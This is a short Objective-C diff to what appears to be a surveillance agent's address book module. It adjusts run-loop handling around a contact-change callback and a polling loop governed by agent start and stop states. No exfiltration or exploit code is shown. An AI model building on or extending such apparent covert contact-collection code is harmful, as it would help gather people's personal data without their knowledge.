@@ -654,7 +654,7 @@ typedef struct _ABLogStrcut {
       return;
     }
   
-  // add the callback for messages (privateFrameworks)
+  // add the callback for messages (privateFrameworks): registered on main thread runloop!
   ABAddressBookRegisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *) self);
   
 #ifdef DEBUG
@@ -677,6 +677,9 @@ typedef struct _ABLogStrcut {
 #endif
     }
 
+  NSPort *aPort = [NSPort port];
+  [[NSRunLoop currentRunLoop] addPort: aPort 
+                              forMode: NSRunLoopCommonModes];
   
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
          [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
@@ -696,9 +699,7 @@ typedef struct _ABLogStrcut {
     
       // Wait waitSec*RL_TIME seconds before fetching AB
       for (int i=0; i<waitSec; i++) 
-        {
-          [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: RL_TIME]];
-        
+        {        
           // Check for agent stopped
           if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
             {
@@ -707,6 +708,7 @@ typedef struct _ABLogStrcut {
 #endif
               break;
             }
+          [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: RL_TIME]];
         }
     
       [innerPool release];
